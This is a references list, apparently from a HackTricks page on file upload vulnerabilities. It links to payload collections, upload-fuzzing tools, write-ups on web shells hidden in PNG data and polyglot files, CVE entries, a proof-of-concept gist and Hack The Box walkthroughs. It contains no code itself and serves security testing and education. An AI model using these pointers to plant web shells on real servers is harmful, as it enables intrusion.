- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
